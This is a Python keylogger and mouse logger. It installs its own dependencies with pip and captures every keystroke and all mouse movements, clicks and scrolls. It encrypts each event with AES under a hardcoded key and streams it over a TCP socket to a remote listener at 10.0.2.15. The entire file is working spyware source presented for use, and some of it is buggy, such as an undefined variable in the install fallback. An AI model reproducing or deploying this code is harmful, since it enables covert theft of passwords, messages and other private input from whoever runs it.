from threading import Thread
from datetime import datetime
import socket
import base64
import os
import sys
import pip

class Setup:
	def CheckMods(self):
		global failed
		failed = []
		try:
			global AES
			from Crypto.Cipher import AES
		except:
			failed.append('PyCrypto')
		try:
			global mouse, keyboard
			from pynput import mouse, keyboard
		except:
			failed.append('pynput')

	def install(self):
		for module in failed:
			if hasattr(pip, 'main'):
				pip.main(['install', module])
			else:
				pip._internal.main(['install', package])
def AES_Enc(key, msg):
	BLOCK_SIZE = 16
	PADDING = '{'
	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
	EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
	cipher = AES.new(key)
	return EncodeAES(cipher, msg)

class mouseSniffer:
	global pre
	pre = '[ MOUSE ]     '
	def move(self,x,y):
		msg = '['+str(datetime.now())+']'+pre+'Pointer moved to {0}'.format((x, y))+'\n'
		s.send(AES_Enc(AESkey, msg))
	def click(self,x,y,button,pressed):
		msg = '['+str(datetime.now())+']'+pre+'{0} at {1}'.format('Pressed' if pressed else 'Released',(x, y))+'\n'
		s.send(AES_Enc(AESkey, msg))
	def scroll(self,x,y,dx,dy):
		msg = '['+str(datetime.now())+']'+pre+'Scrolled {0} at {1}'.format('down' if dy < 0 else 'up',(x, y))+'\n'
		s.send(AES_Enc(AESkey, msg))

class keySniffer:
	global pre1
	pre1 = '[ KEYBOARD ]  '
	def press(self,key):
		try:
			msg = '['+str(datetime.now())+']'+pre1+'(alphanumeric) Key pressed: ' + key.char+'\n'
			s.send(AES_Enc(AESkey, msg))
		except AttributeError:
			msg = '['+str(datetime.now())+']'+pre1+'(special type) Key pressed: ' + str(key)+'\n'
			s.send(AES_Enc(AESkey, msg))

def m():
	MS = mouseSniffer()
	with mouse.Listener(
		on_move=MS.move,
		on_click=MS.click,
		on_scroll=MS.scroll) as listener:
		listener.join()
def k():
	KS = keySniffer()
	with keyboard.Listener(
		on_press=KS.press) as listener:
		listener.join()
def main():
	su = Setup()
	su.CheckMods()
	su.install()
	global AESkey
	AESkey = 'aaaaaaaaaaaaaaaa'
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('10.0.2.15', 44))
	Thread(target=m).start() # comment this line out if you only want to log keys
	Thread(target=k).start() # comment this line out if you only want to log mouse activity

if __name__ == '__main__':
	main()
